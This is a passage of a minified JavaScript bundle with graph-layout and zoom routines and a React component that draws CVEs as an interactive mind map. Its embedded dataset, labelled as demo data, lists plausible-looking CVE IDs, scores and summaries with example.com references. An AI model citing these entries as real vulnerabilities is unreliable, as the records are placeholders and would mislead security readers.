ke(r,c,u,l,o)),(r=s[2])&&n.push(new ke(r,i,u,c,o)),(r=s[1])&&n.push(new ke(r,c,a,l,u)),(r=s[0])&&n.push(new ke(r,i,a,c,u))}return this}function f1(e){var n=[],t=[],s;for(this._root&&n.push(new ke(this._root,this._x0,this._y0,this._x1,this._y1));s=n.pop();){var r=s.node;if(r.length){var i,a=s.x0,l=s.y0,o=s.x1,c=s.y1,u=(a+o)/2,m=(l+c)/2;(i=r[0])&&n.push(new ke(i,a,l,u,m)),(i=r[1])&&n.push(new ke(i,u,l,o,m)),(i=r[2])&&n.push(new ke(i,a,m,u,c)),(i=r[3])&&n.push(new ke(i,u,m,o,c))}t.push(s)}for(;s=t.pop();)e(s.node,s.x0,s.y0,s.x1,s.y1);return this}function m1(e){return e[0]}function g1(e){return arguments.length?(this._x=e,this):this._x}function v1(e){return e[1]}function y1(e){return arguments.length?(this._y=e,this):this._y}function xo(e,n,t){var s=new bo(n??m1,t??v1,NaN,NaN,NaN,NaN);return e==null?s:s.addAll(e)}function bo(e,n,t,s,r,i){this._x=e,this._y=n,this._x0=t,this._y0=s,this._x1=r,this._y1=i,this._root=void 0}function au(e){for(var n={data:e.data},t=n;e=e.next;)t=t.next={data:e.data};return n}var Se=xo.prototype=bo.prototype;Se.copy=function(){var e=new bo(this._x,this._y,this._x0,this._y0,this._x1,this._y1),n=this._root,t,s;if(!n)return e;if(!n.length)return e._root=au(n),e;for(t=[{source:n,target:e._root=new Array(4)}];n=t.pop();)for(var r=0;r<4;++r)(s=n.source[r])&&(s.length?t.push({source:s,target:n.target[r]=new Array(4)}):n.target[r]=au(s));return e};Se.add=s1;Se.addAll=r1;Se.cover=i1;Se.data=a1;Se.extent=l1;Se.find=o1;Se.remove=c1;Se.removeAll=u1;Se.root=p1;Se.size=d1;Se.visit=h1;Se.visitAfter=f1;Se.x=g1;Se.y=y1;function it(e){return function(){return e}}function On(e){return(e()-.5)*1e-6}function w1(e){return e.x+e.vx}function k1(e){return e.y+e.vy}function x1(e){var n,t,s,r=1,i=1;typeof e!="function"&&(e=it(e==null?1:+e));function a(){for(var c,u=n.length,m,h,g,k,y,x,p=0;p<i;++p)for(m=xo(n,w1,k1).visitAfter(l),c=0;c<u;++c)h=n[c],y=t[h.index],x=y*y,g=h.x+h.vx,k=h.y+h.vy,m.visit(f);function f(v,w,_,N,A){var P=v.data,z=v.r,M=y+z;if(P){if(P.index>h.index){var Q=g-P.x-P.vx,pe=k-P.y-P.vy,ae=Q*Q+pe*pe;ae<M*M&&(Q===0&&(Q=On(s),ae+=Q*Q),pe===0&&(pe=On(s),ae+=pe*pe),ae=(M-(ae=Math.sqrt(ae)))/ae*r,h.vx+=(Q*=ae)*(M=(z*=z)/(x+z)),h.vy+=(pe*=ae)*M,P.vx-=Q*(M=1-M),P.vy-=pe*M)}return}return w>g+M||N<g-M||_>k+M||A<k-M}}function l(c){if(c.data)return c.r=t[c.data.index];for(var u=c.r=0;u<4;++u)c[u]&&c[u].r>c.r&&(c.r=c[u].r)}function o(){if(n){var c,u=n.length,m;for(t=new Array(u),c=0;c<u;++c)m=n[c],t[m.index]=+e(m,c,n)}}return a.initialize=function(c,u){n=c,s=u,o()},a.iterations=function(c){return arguments.length?(i=+c,a):i},a.strength=function(c){return arguments.length?(r=+c,a):r},a.radius=function(c){return arguments.length?(e=typeof c=="function"?c:it(+c),o(),a):e},a}function b1(e){return e.index}function lu(e,n){var t=e.get(n);if(!t)throw new Error("node not found: "+n);return t}function _1(e){var n=b1,t=m,s,r=it(30),i,a,l,o,c,u=1;e==null&&(e=[]);function m(x){return 1/Math.min(l[x.source.index],l[x.target.index])}function h(x){for(var p=0,f=e.length;p<u;++p)for(var v=0,w,_,N,A,P,z,M;v<f;++v)w=e[v],_=w.source,N=w.target,A=N.x+N.vx-_.x-_.vx||On(c),P=N.y+N.vy-_.y-_.vy||On(c),z=Math.sqrt(A*A+P*P),z=(z-i[v])/z*x*s[v],A*=z,P*=z,N.vx-=A*(M=o[v]),N.vy-=P*M,_.vx+=A*(M=1-M),_.vy+=P*M}function g(){if(a){var x,p=a.length,f=e.length,v=new Map(a.map((_,N)=>[n(_,N,a),_])),w;for(x=0,l=new Array(p);x<f;++x)w=e[x],w.index=x,typeof w.source!="object"&&(w.source=lu(v,w.source)),typeof w.target!="object"&&(w.target=lu(v,w.target)),l[w.source.index]=(l[w.source.index]||0)+1,l[w.target.index]=(l[w.target.index]||0)+1;for(x=0,o=new Array(f);x<f;++x)w=e[x],o[x]=l[w.source.index]/(l[w.source.index]+l[w.target.index]);s=new Array(f),k(),i=new Array(f),y()}}function k(){if(a)for(var x=0,p=e.length;x<p;++x)s[x]=+t(e[x],x,e)}function y(){if(a)for(var x=0,p=e.length;x<p;++x)i[x]=+r(e[x],x,e)}return h.initialize=function(x,p){a=x,c=p,g()},h.links=function(x){return arguments.length?(e=x,g(),h):e},h.id=function(x){return arguments.length?(n=x,h):n},h.iterations=function(x){return arguments.length?(u=+x,h):u},h.strength=function(x){return arguments.length?(t=typeof x=="function"?x:it(+x),k(),h):t},h.distance=function(x){return arguments.length?(r=typeof x=="function"?x:it(+x),y(),h):r},h}const S1=1664525,E1=1013904223,ou=4294967296;function T1(){let e=1;return()=>(e=(S1*e+E1)%ou)/ou}function C1(e){return e.x}function N1(e){return e.y}var A1=10,P1=Math.PI*(3-Math.sqrt(5));function L1(e){var n,t=1,s=.001,r=1-Math.pow(s,1/300),i=0,a=.6,l=new Map,o=yo(m),c=Pi("tick","end"),u=T1();e==null&&(e=[]);function m(){h(),c.call("tick",n),t<s&&(o.stop(),c.call("end",n))}function h(y){var x,p=e.length,f;y===void 0&&(y=1);for(var v=0;v<y;++v)for(t+=(i-t)*r,l.forEach(function(w){w(t)}),x=0;x<p;++x)f=e[x],f.fx==null?f.x+=f.vx*=a:(f.x=f.fx,f.vx=0),f.fy==null?f.y+=f.vy*=a:(f.y=f.fy,f.vy=0);return n}function g(){for(var y=0,x=e.length,p;y<x;++y){if(p=e[y],p.index=y,p.fx!=null&&(p.x=p.fx),p.fy!=null&&(p.y=p.fy),isNaN(p.x)||isNaN(p.y)){var f=A1*Math.sqrt(.5+y),v=y*P1;p.x=f*Math.cos(v),p.y=f*Math.sin(v)}(isNaN(p.vx)||isNaN(p.vy))&&(p.vx=p.vy=0)}}function k(y){return y.initialize&&y.initialize(e,u),y}return g(),n={tick:h,restart:function(){return o.restart(m),n},stop:function(){return o.stop(),n},nodes:function(y){return arguments.length?(e=y,g(),l.forEach(k),n):e},alpha:function(y){return arguments.length?(t=+y,n):t},alphaMin:function(y){return arguments.length?(s=+y,n):s},alphaDecay:function(y){return arguments.length?(r=+y,n):+r},alphaTarget:function(y){return arguments.length?(i=+y,n):i},velocityDecay:function(y){return arguments.length?(a=1-y,n):1-a},randomSource:function(y){return arguments.length?(u=y,l.forEach(k),n):u},force:function(y,x){return arguments.length>1?(x==null?l.delete(y):l.set(y,k(x)),n):l.get(y)},find:function(y,x,p){var f=0,v=e.length,w,_,N,A,P;for(p==null?p=1/0:p*=p,f=0;f<v;++f)A=e[f],w=y-A.x,_=x-A.y,N=w*w+_*_,N<p&&(P=A,p=N);return P},on:function(y,x){return arguments.length>1?(c.on(y,x),n):c.on(y)}}}function R1(){var e,n,t,s,r=it(-30),i,a=1,l=1/0,o=.81;function c(g){var k,y=e.length,x=xo(e,C1,N1).visitAfter(m);for(s=g,k=0;k<y;++k)n=e[k],x.visit(h)}function u(){if(e){var g,k=e.length,y;for(i=new Array(k),g=0;g<k;++g)y=e[g],i[y.index]=+r(y,g,e)}}function m(g){var k=0,y,x,p=0,f,v,w;if(g.length){for(f=v=w=0;w<4;++w)(y=g[w])&&(x=Math.abs(y.value))&&(k+=y.value,p+=x,f+=x*y.x,v+=x*y.y);g.x=f/p,g.y=v/p}else{y=g,y.x=y.data.x,y.y=y.data.y;do k+=i[y.data.index];while(y=y.next)}g.value=k}function h(g,k,y,x){if(!g.value)return!0;var p=g.x-n.x,f=g.y-n.y,v=x-k,w=p*p+f*f;if(v*v/o<w)return w<l&&(p===0&&(p=On(t),w+=p*p),f===0&&(f=On(t),w+=f*f),w<a&&(w=Math.sqrt(a*w)),n.vx+=p*g.value*s/w,n.vy+=f*g.value*s/w),!0;if(g.length||w>=l)return;(g.data!==n||g.next)&&(p===0&&(p=On(t),w+=p*p),f===0&&(f=On(t),w+=f*f),w<a&&(w=Math.sqrt(a*w)));do g.data!==n&&(v=i[g.data.index]*s/w,n.vx+=p*v,n.vy+=f*v);while(g=g.next)}return c.initialize=function(g,k){e=g,t=k,u()},c.strength=function(g){return arguments.length?(r=typeof g=="function"?g:it(+g),u(),c):r},c.distanceMin=function(g){return arguments.length?(a=g*g,c):Math.sqrt(a)},c.distanceMax=function(g){return arguments.length?(l=g*g,c):Math.sqrt(l)},c.theta=function(g){return arguments.length?(o=g*g,c):Math.sqrt(o)},c}const yr=e=>()=>e;function O1(e,{sourceEvent:n,target:t,transform:s,dispatch:r}){Object.defineProperties(this,{type:{value:e,enumerable:!0,configurable:!0},sourceEvent:{value:n,enumerable:!0,configurable:!0},target:{value:t,enumerable:!0,configurable:!0},transform:{value:s,enumerable:!0,configurable:!0},_:{value:r}})}function mn(e,n,t){this.k=e,this.x=n,this.y=t}mn.prototype={constructor:mn,scale:function(e){return e===1?this:new mn(this.k*e,this.x,this.y)},translate:function(e,n){return e===0&n===0?this:new mn(this.k,this.x+this.k*e,this.y+this.k*n)},apply:function(e){return[e[0]*this.k+this.x,e[1]*this.k+this.y]},applyX:function(e){return e*this.k+this.x},applyY:function(e){return e*this.k+this.y},invert:function(e){return[(e[0]-this.x)/this.k,(e[1]-this.y)/this.k]},invertX:function(e){return(e-this.x)/this.k},invertY:function(e){return(e-this.y)/this.k},rescaleX:function(e){return e.copy().domain(e.range().map(this.invertX,this).map(e.invert,e))},rescaleY:function(e){return e.copy().domain(e.range().map(this.invertY,this).map(e.invert,e))},toString:function(){return"translate("+this.x+","+this.y+") scale("+this.k+")"}};var _o=new mn(1,0,0);mn.prototype;function ua(e){e.stopImmediatePropagation()}function rs(e){e.preventDefault(),e.stopImmediatePropagation()}function M1(e){return(!e.ctrlKey||e.type==="wheel")&&!e.button}function j1(){var e=this;return e instanceof SVGElement?(e=e.ownerSVGElement||e,e.hasAttribute("viewBox")?(e=e.viewBox.baseVal,[[e.x,e.y],[e.x+e.width,e.y+e.height]]):[[0,0],[e.width.baseVal.value,e.height.baseVal.value]]):[[0,0],[e.clientWidth,e.clientHeight]]}function cu(){return this.__zoom||_o}function I1(e){return-e.deltaY*(e.deltaMode===1?.05:e.deltaMode?1:.002)*(e.ctrlKey?10:1)}function z1(){return navigator.maxTouchPoints||"ontouchstart"in this}function D1(e,n,t){var s=e.invertX(n[0][0])-t[0][0],r=e.invertX(n[1][0])-t[1][0],i=e.invertY(n[0][1])-t[0][1],a=e.invertY(n[1][1])-t[1][1];return e.translate(r>s?(s+r)/2:Math.min(0,s)||Math.max(0,r),a>i?(i+a)/2:Math.min(0,i)||Math.max(0,a))}function B1(){var e=M1,n=j1,t=D1,s=I1,r=z1,i=[0,1/0],a=[[-1/0,-1/0],[1/0,1/0]],l=250,o=W0,c=Pi("start","zoom","end"),u,m,h,g=500,k=150,y=0,x=10;function p(b){b.property("__zoom",cu).on("wheel.zoom",P,{passive:!1}).on("mousedown.zoom",z).on("dblclick.zoom",M).filter(r).on("touchstart.zoom",Q).on("touchmove.zoom",pe).on("touchend.zoom touchcancel.zoom",ae).style("-webkit-tap-highlight-color","rgba(0,0,0,0)")}p.transform=function(b,j,C,I){var E=b.selection?b.selection():b;E.property("__zoom",cu),b!==E?_(b,j,C,I):E.interrupt().each(function(){N(this,arguments).event(I).start().zoom(null,typeof j=="function"?j.apply(this,arguments):j).end()})},p.scaleBy=function(b,j,C,I){p.scaleTo(b,function(){var E=this.__zoom.k,L=typeof j=="function"?j.apply(this,arguments):j;return E*L},C,I)},p.scaleTo=function(b,j,C,I){p.transform(b,function(){var E=n.apply(this,arguments),L=this.__zoom,R=C==null?w(E):typeof C=="function"?C.apply(this,arguments):C,D=L.invert(R),B=typeof j=="function"?j.apply(this,arguments):j;return t(v(f(L,B),R,D),E,a)},C,I)},p.translateBy=function(b,j,C,I){p.transform(b,function(){return t(this.__zoom.translate(typeof j=="function"?j.apply(this,arguments):j,typeof C=="function"?C.apply(this,arguments):C),n.apply(this,arguments),a)},null,I)},p.translateTo=function(b,j,C,I,E){p.transform(b,function(){var L=n.apply(this,arguments),R=this.__zoom,D=I==null?w(L):typeof I=="function"?I.apply(this,arguments):I;return t(_o.translate(D[0],D[1]).scale(R.k).translate(typeof j=="function"?-j.apply(this,arguments):-j,typeof C=="function"?-C.apply(this,arguments):-C),L,a)},I,E)};function f(b,j){return j=Math.max(i[0],Math.min(i[1],j)),j===b.k?b:new mn(j,b.x,b.y)}function v(b,j,C){var I=j[0]-C[0]*b.k,E=j[1]-C[1]*b.k;return I===b.x&&E===b.y?b:new mn(b.k,I,E)}function w(b){return[(+b[0][0]+ +b[1][0])/2,(+b[0][1]+ +b[1][1])/2]}function _(b,j,C,I){b.on("start.zoom",function(){N(this,arguments).event(I).start()}).on("interrupt.zoom end.zoom",function(){N(this,arguments).event(I).end()}).tween("zoom",function(){var E=this,L=arguments,R=N(E,L).event(I),D=n.apply(E,L),B=C==null?w(D):typeof C=="function"?C.apply(E,L):C,ve=Math.max(D[1][0]-D[0][0],D[1][1]-D[0][1]),W=E.__zoom,ye=typeof j=="function"?j.apply(E,L):j,le=o(W.invert(B).concat(ve/W.k),ye.invert(B).concat(ve/ye.k));return function(de){if(de===1)de=ye;else{var on=le(de),Mi=ve/on[2];de=new mn(Mi,B[0]-on[0]*Mi,B[1]-on[1]*Mi)}R.zoom(null,de)}})}function N(b,j,C){return!C&&b.__zooming||new A(b,j)}function A(b,j){this.that=b,this.args=j,this.active=0,this.sourceEvent=null,this.extent=n.apply(b,j),this.taps=0}A.prototype={event:function(b){return b&&(this.sourceEvent=b),this},start:function(){return++this.active===1&&(this.that.__zooming=this,this.emit("start")),this},zoom:function(b,j){return this.mouse&&b!=="mouse"&&(this.mouse[1]=j.invert(this.mouse[0])),this.touch0&&b!=="touch"&&(this.touch0[1]=j.invert(this.touch0[0])),this.touch1&&b!=="touch"&&(this.touch1[1]=j.invert(this.touch1[0])),this.that.__zoom=j,this.emit("zoom"),this},end:function(){return--this.active===0&&(delete this.that.__zooming,this.emit("end")),this},emit:function(b){var j=dn(this.that).datum();c.call(b,this.that,new O1(b,{sourceEvent:this.sourceEvent,target:p,transform:this.that.__zoom,dispatch:c}),j)}};function P(b,...j){if(!e.apply(this,arguments))return;var C=N(this,j).event(b),I=this.__zoom,E=Math.max(i[0],Math.min(i[1],I.k*Math.pow(2,s.apply(this,arguments)))),L=Xn(b);if(C.wheel)(C.mouse[0][0]!==L[0]||C.mouse[0][1]!==L[1])&&(C.mouse[1]=I.invert(C.mouse[0]=L)),clearTimeout(C.wheel);else{if(I.k===E)return;C.mouse=[L,I.invert(L)],Mr(this),C.start()}rs(b),C.wheel=setTimeout(R,k),C.zoom("mouse",t(v(f(I,E),C.mouse[0],C.mouse[1]),C.extent,a));function R(){C.wheel=null,C.end()}}function z(b,...j){if(h||!e.apply(this,arguments))return;var C=b.currentTarget,I=N(this,j,!0).event(b),E=dn(b.view).on("mousemove.zoom",B,!0).on("mouseup.zoom",ve,!0),L=Xn(b,C),R=b.clientX,D=b.clientY;v0(b.view),ua(b),I.mouse=[L,this.__zoom.invert(L)],Mr(this),I.start();function B(W){if(rs(W),!I.moved){var ye=W.clientX-R,le=W.clientY-D;I.moved=ye*ye+le*le>y}I.event(W).zoom("mouse",t(v(I.that.__zoom,I.mouse[0]=Xn(W,C),I.mouse[1]),I.extent,a))}function ve(W){E.on("mousemove.zoom mouseup.zoom",null),y0(W.view,I.moved),rs(W),I.event(W).end()}}function M(b,...j){if(e.apply(this,arguments)){var C=this.__zoom,I=Xn(b.changedTouches?b.changedTouches[0]:b,this),E=C.invert(I),L=C.k*(b.shiftKey?.5:2),R=t(v(f(C,L),I,E),n.apply(this,j),a);rs(b),l>0?dn(this).transition().duration(l).call(_,R,I,b):dn(this).call(p.transform,R,I,b)}}function Q(b,...j){if(e.apply(this,arguments)){var C=b.touches,I=C.length,E=N(this,j,b.changedTouches.length===I).event(b),L,R,D,B;for(ua(b),R=0;R<I;++R)D=C[R],B=Xn(D,this),B=[B,this.__zoom.invert(B),D.identifier],E.touch0?!E.touch1&&E.touch0[2]!==B[2]&&(E.touch1=B,E.taps=0):(E.touch0=B,L=!0,E.taps=1+!!u);u&&(u=clearTimeout(u)),L&&(E.taps<2&&(m=B[0],u=setTimeout(function(){u=null},g)),Mr(this),E.start())}}function pe(b,...j){if(this.__zooming){var C=N(this,j).event(b),I=b.changedTouches,E=I.length,L,R,D,B;for(rs(b),L=0;L<E;++L)R=I[L],D=Xn(R,this),C.touch0&&C.touch0[2]===R.identifier?C.touch0[0]=D:C.touch1&&C.touch1[2]===R.identifier&&(C.touch1[0]=D);if(R=C.that.__zoom,C.touch1){var ve=C.touch0[0],W=C.touch0[1],ye=C.touch1[0],le=C.touch1[1],de=(de=ye[0]-ve[0])*de+(de=ye[1]-ve[1])*de,on=(on=le[0]-W[0])*on+(on=le[1]-W[1])*on;R=f(R,Math.sqrt(de/on)),D=[(ve[0]+ye[0])/2,(ve[1]+ye[1])/2],B=[(W[0]+le[0])/2,(W[1]+le[1])/2]}else if(C.touch0)D=C.touch0[0],B=C.touch0[1];else return;C.zoom("touch",t(v(R,D,B),C.extent,a))}}function ae(b,...j){if(this.__zooming){var C=N(this,j).event(b),I=b.changedTouches,E=I.length,L,R;for(ua(b),h&&clearTimeout(h),h=setTimeout(function(){h=null},g),L=0;L<E;++L)R=I[L],C.touch0&&C.touch0[2]===R.identifier?delete C.touch0:C.touch1&&C.touch1[2]===R.identifier&&delete C.touch1;if(C.touch1&&!C.touch0&&(C.touch0=C.touch1,delete C.touch1),C.touch0)C.touch0[1]=this.__zoom.invert(C.touch0[0]);else if(C.end(),C.taps===2&&(R=Xn(R,this),Math.hypot(m[0]-R[0],m[1]-R[1])<x)){var D=dn(this).on("dblclick.zoom");D&&D.apply(this,arguments)}}}return p.wheelDelta=function(b){return arguments.length?(s=typeof b=="function"?b:yr(+b),p):s},p.filter=function(b){return arguments.length?(e=typeof b=="function"?b:yr(!!b),p):e},p.touchable=function(b){return arguments.length?(r=typeof b=="function"?b:yr(!!b),p):r},p.extent=function(b){return arguments.length?(n=typeof b=="function"?b:yr([[+b[0][0],+b[0][1]],[+b[1][0],+b[1][1]]]),p):n},p.scaleExtent=function(b){return arguments.length?(i[0]=+b[0],i[1]=+b[1],p):[i[0],i[1]]},p.translateExtent=function(b){return arguments.length?(a[0][0]=+b[0][0],a[1][0]=+b[1][0],a[0][1]=+b[0][1],a[1][1]=+b[1][1],p):[[a[0][0],a[0][1]],[a[1][0],a[1][1]]]},p.constrain=function(b){return arguments.length?(t=b,p):t},p.duration=function(b){return arguments.length?(l=+b,p):l},p.interpolate=function(b){return arguments.length?(o=b,p):o},p.on=function(){var b=c.on.apply(c,arguments);return b===c?p:b},p.clickDistance=function(b){return arguments.length?(y=(b=+b)*b,p):Math.sqrt(y)},p.tapDistance=function(b){return arguments.length?(x=+b,p):x},p}const F1={domain:"#00ff41",technology:"#00ff41",cluster:"#00ff41",cve:"#00ff41"};function U1(e,n){const t=[],s=[],r=(i,a=null,l=0)=>{var h,g;const o=i.id||i.name||`${i.nodeType}-${t.length}`;t.push({id:o,name:i.name,type:i.nodeType||(i.children?"group":"cve"),metrics:i.metrics,info:i,depth:l}),a&&s.push({source:a,target:o});const c=n.has(o),u=((g=(h=i.children)==null?void 0:h[0])==null?void 0:g.nodeType)||null;if(!(!(l<2||c)||!i.children)){for(const k of i.children)k.nodeType==="cve"&&!c||r(k,o,l+1);if(!c&&i.children&&u!=="cve"&&i.children.length){const k=`${o}-collapsed`;t.push({id:k,name:"+",type:"collapsed",depth:l+1,info:{hint:`${i.children.length} hidden`}}),s.push({source:o,target:k})}}};return r(e,null,0),{nodes:t,links:s}}function V1({data:e,onSelectCve:n,highlightId:t,onHover:s,onFocusPath:r}){const i=S.useRef(null),[a,l]=S.useState(new Set),[o,c]=S.useState({nodes:[],links:[]}),[u,m]=S.useState(_o),{nodes:h,links:g}=S.useMemo(()=>U1(e,a),[e,a]),k=S.useMemo(()=>{const p=new Map;return o.nodes.forEach(f=>p.set(f.id,f)),p},[o.nodes]);S.useEffect(()=>{if(!t||!e)return;const p=[],f=(v,w)=>{const _=v.id||v.name,N=[...w,v.name];if((_==null?void 0:_.toLowerCase())===t.toLowerCase())return p.push(...N),!0;if(!v.children)return!1;for(const A of v.children)if(f(A,N))return!0;return!1};f(e,[]),p.length&&(r==null||r(p))},[t,e,r]),S.useEffect(()=>{if(!h.length)return;dn(i.current);const v=L1(h).force("link",_1(g).id(w=>w.id).distance(w=>w.target.type==="cve"?90:w.target.type==="cluster"?140:200).strength(.8)).force("charge",R1().strength(-260)).force("center",t1(960/2,640/2)).force("collision",x1().radius(w=>w.type==="cve"?26:38)).stop();for(let w=0;w<200;w+=1)v.tick();return c({nodes:[...v.nodes()],links:g.map(w=>({source:w.source.id,target:w.target.id}))}),()=>v.stop()},[h,g]),S.useEffect(()=>{const p=dn(i.current),f=B1().scaleExtent([.6,2.5]).on("zoom",v=>m(v.transform));return p.call(f),()=>p.on(".zoom",null)},[]);const y=p=>{const f=p.id;f&&l(v=>{const w=new Set(v);return w.has(f)?w.delete(f):w.add(f),w})},x=p=>{if(p.type==="cve")n==null||n(p.info);else if(p.type==="collapsed"){const f=p.id.replace("-collapsed","");l(v=>new Set([...v,f]))}else y(p)};return d.jsx("div",{className:"cve-mindmap",children:d.jsxs("svg",{ref:i,viewBox:"0 0 960 640",role:"presentation",children:[d.jsx("defs",{children:d.jsxs("filter",{id:"glow",children:[d.jsx("feGaussianBlur",{stdDeviation:"2.5",result:"coloredBlur"}),d.jsxs("feMerge",{children:[d.jsx("feMergeNode",{in:"coloredBlur"}),d.jsx("feMergeNode",{in:"SourceGraphic"})]})]})}),d.jsxs("g",{transform:`translate(${u.x},${u.y}) scale(${u.k})`,children:[o.links.map(p=>{var f,v,w,_;return d.jsx("line",{x1:(f=k.get(p.source))==null?void 0:f.x,y1:(v=k.get(p.source))==null?void 0:v.y,x2:(w=k.get(p.target))==null?void 0:w.x,y2:(_=k.get(p.target))==null?void 0:_.y,stroke:"rgba(0, 255, 65, 0.35)",strokeWidth:1,strokeDasharray:p.target.type==="collapsed"?"4 4":"0"},`${p.source.id}-${p.target.id}`)}),o.nodes.map(p=>{var _;const f=p.type==="cve"?14:p.type==="cluster"?18:24,v=t&&((_=p.id)==null?void 0:_.toLowerCase())===t.toLowerCase(),w=F1[p.type]||"#8fd6ff";return d.jsxs("g",{transform:`translate(${p.x},${p.y})`,className:`mindmap-node ${p.type}`,onClick:()=>x(p),onMouseEnter:()=>s==null?void 0:s(p),onMouseLeave:()=>s==null?void 0:s(null),style:{cursor:"pointer"},children:[d.jsx("circle",{r:f,fill:w,fillOpacity:v?1:.7,stroke:v?"#00ff41":"rgba(255,255,255,0.12)",strokeWidth:v?2:1,filter:"url(#glow)"}),d.jsx("text",{textAnchor:"middle",dy:"0.35em",fontSize:11,fill:"#000000",children:p.type==="collapsed"?"+":p.name})]},p.id)})]})]})})}const oh=[{id:"cloud",name:"Cloud",metrics:{total:420,kev:18,maxCvss:9.8,latestYear:2025},technologies:[{id:"aws-iam",name:"AWS IAM",metrics:{total:74,kev:4,maxCvss:9,latestYear:2025},clusters:[{id:"2025-critical",label:"2025 · Critical",kind:"severity",metrics:{total:4,kev:1,maxCvss:9.8,latestYear:2025},cves:[{id:"CVE-2025-10010",title:"AWS IAM policy wildcard privilege escalation",severity:"Critical",cvss:9.8,year:2025,kev:!0,summary:"Wildcard principal on cross-account role enables unintended assumeRole and lateral movement.",references:["https://example.com/advisory/iam-2025-10010"]},{id:"CVE-2025-12001",title:"IAM session tagging bypass",severity:"High",cvss:8.6,year:2025,kev:!1,summary:"Session tags not validated under certain SAML flows allow privilege creep.",references:["https://example.com/blog/iam-session-tagging"]}]},{id:"2024-high",label:"2024 · High",kind:"severity",metrics:{total:3,kev:0,maxCvss:8.2,latestYear:2024},cves:[{id:"CVE-2024-41001",title:"Conditional policy logic bypass",severity:"High",cvss:8.2,year:2024,kev:!1,summary:"Malformed condition key evaluation permits unintended resource access.",references:["https://example.com/advisory/iam-41001"]}]}]},{id:"kubernetes",name:"Kubernetes",metrics:{total:112,kev:7,maxCvss:9.8,latestYear:2025},clusters:[{id:"2025-priv-esc",label:"2025 · PrivEsc",kind:"cwe",metrics:{total:5,kev:1,maxCvss:9.4,latestYear:2025},cves:[{id:"CVE-2025-21001",title:"kubelet RunPodSandbox path traversal",severity:"High",cvss:9,year:2025,kev:!0,summary:"Malicious runtime config enables hostPath escape via pod sandbox setup.",references:["https://example.com/k8s/runpodsandbox"]},{id:"CVE-2025-21005",title:"API server authn cache poisoning",severity:"High",cvss:8.8,year:2025,kev:!1,summary:"Race in authenticator cache allows replay of stale tokens during fail-open windows.",references:["https://example.com/k8s/authn-cache"]}]},{id:"2024-network",label:"2024 · Net",kind:"year",metrics:{total:4,kev:0,maxCvss:7.5,latestYear:2024},cves:[{id:"CVE-2024-32001",title:"Ingress controller header smuggling",severity:"Medium",cvss:6.5,year:2024,kev:!1,summary:"Improper canonicalization permits smuggling past backend auth.",references:["https://example.com/k8s/ingress-headers"]}]}]}]},{id:"os",name:"Operating Systems",metrics:{total:610,kev:23,maxCvss:10,latestYear:2025},technologies:[{id:"linux-kernel",name:"Linux Kernel",metrics:{total:380,kev:17,maxCvss:10,latestYear:2025},clusters:[{id:"2025-overflow",label:"2025 · Overflow",kind:"cwe",metrics:{total:6,kev:2,maxCvss:9.8,latestYear:2025},cves:[{id:"CVE-2025-12020",title:"netfilter nft_payload buffer overflow",severity:"Critical",cvss:9.8,year:2025,kev:!0,summary:"Bounds check omission in nft_payload leads to OOB write from crafted netlink.",references:["https://example.com/kernel/nft_payload"]},{id:"CVE-2025-14001",title:"io_uring SQE refcount underflow",severity:"High",cvss:8.4,year:2025,kev:!1,summary:"Race on submission queue entries permits UAF and potential LPE.",references:["https://example.com/kernel/io_uring"]}]},{id:"2024-mem",label:"2024 · Memory Safety",kind:"year",metrics:{total:4,kev:0,maxCvss:7.8,latestYear:2024},cves:[{id:"CVE-2024-33010",title:"xfrm policy double free",severity:"High",cvss:7.8,year:2024,kev:!1,summary:"Error path double free reachable via malformed XFRM policy update.",references:["https://example.com/kernel/xfrm-double-free"]}]}]},{id:"openssl",name:"OpenSSL",metrics:{total:88,kev:3,maxCvss:9.8,latestYear:2025},clusters:[{id:"2025-crypto",label:"2025 · Crypto",kind:"cwe",metrics:{total:2,kev:0,maxCvss:8,latestYear:2025},cves:[{id:"CVE-2025-20001",title:"PKCS#7 parsing OOB read",severity:"High",cvss:7.5,year:2025,kev:!1,summary:"Unbounded length handling in PKCS#7 CMS parsing can leak heap bytes.",references:["https://example.com/openssl/pkcs7"]}]},{id:"2024-crypto",label:"2024 · Crypto",kind:"year",metrics:{total:1,kev:0,maxCvss:7.4,latestYear:2024},cves:[{id:"CVE-2024-35010",title:"DTLS replay window bypass",severity:"Medium",cvss:7.4,year:2024,kev:!1,summary:"Logic flaw in replay window advancement allows limited packet replay.",references:["https://example.com/openssl/dtls-replay"]}]}]}]}],uu={headline:"Zoom into technologies and see clustered CVEs. Click a CVE to open its details.",datasetHint:"Demo dataset; wire NVD feeds + your own aggregations for production."};function H1(e={}){const{severities:n=["Critical","High","Medium","Low"],minCvss:t=0,minYear:s=0,kevOnly:r=!1}=e,i=l=>{const o=n.includes(l.severity),c=Number(l.year)>=Number(s||0),u=Number(l.cvss||0)>=Number(t||0),m=r?!!l.kev:!0;return o&&c&&u&&m};return{name:"CVE Map",children:oh.map(l=>{const o=l.technologies.map(c=>{const u=c.clusters.map(m=>{const h=(m.cves||[]).filter(i);return h.length?{...m,cves:h}:null}).filter(Boolean);return u.length?{...c,clusters:u}:null}).filter(Boolean);return o.length?{...l,technologies:o}:null}).filter(Boolean).map(l=>({...l,name:l.name,children:l.technologies.map(o=>({...o,name:o.name,children:o.clusters.map(c=>({...c,name:c.label,children:c.cves.map(u=>({...u,name:`${u.id}`,value:u.cvss||1,nodeType:"cve"})),nodeType:"cluster"})),nodeType:"technology"})),nodeType:"domain"})),nodeType:"root"}}function W1(e){for(const n of oh)for(const t of n.technologies)for(const s of t.clusters)for(const r of s.cves)if(r.id.toLowerCase()===e.toLowerCase())return r;return null}function $1(){var p,f,v,w,_,N,A,P;const[e]=S.useState({severities:["Critical","High","Medium","Low"],minCvss:0,minYear:2024,kevOnly:!1}),n=S.useMemo(()=>H1(e),[e]),[t,s]=S.useState(null),[r,i]=S.useState([]),[a,l]=S.useState(0),[o,c]=S.useState(null),[u,m]=S.useState(""),[h,g]=S.useState(""),k=z=>{s(z),g((z==null?void 0:z.id)||"")},y=()=>{s(null),i([]),l(z=>z+1),m(""),g("")},x=z=>{if(z.preventDefault(),!u.trim())return;const M=W1(u.trim());M?(s(M),g(M.id)):g("")};return d.jsxs("div",{className:"cve-fullscreen",children:[d.jsxs("div",{className:"mindmap-controls",children:[d.jsxs("div",{className:"mindmap-path",children:[d.jsx("p",{className:"pill",children:"Mind Map"}),d.jsx("span",{className:"breadcrumb",children:r.length?r.join(" / "):"CVE Map"})]}),d.jsx("p",{className:"mindmap-hint",children:"Drag to explore, scroll/pinch to zoom, click nodes to expand/collapse, click CVEs for 